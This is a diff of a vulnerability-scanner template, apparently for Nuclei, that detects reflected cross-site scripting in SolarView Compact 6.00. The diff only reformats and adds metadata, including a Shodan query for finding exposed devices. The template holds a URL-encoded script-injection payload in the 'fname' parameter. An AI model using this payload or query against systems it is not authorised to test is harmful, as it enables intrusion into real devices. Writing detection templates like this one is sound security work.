@@ -1,5 +1,4 @@
 id: solarview-compact-xss
-
 info:
   name: SolarView Compact 6.00 - Cross-Site Scripting
   author: ritikchaddha
@@ -14,29 +13,26 @@ info:
     cwe-id: CWE-79
     cpe: cpe:2.3:h:contec:solarview_compact:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: solarview_compact
+    shodan-query: http.html:"SolarView Compact"
     vendor: contec
-  tags: xss,solarview,edb,vuln
-
+    verified: true
+  tags: edb,solarview,vuln,xss
 http:
-  - method: GET
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - value="test"><script>alert(document.domain)</script>">
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'value="test"><script>alert(document.domain)</script>">'
-
-      - type: word
-        part: header
-        words:
-          - "text/html"
-
-      - type: status
-        status:
-          - 200
-
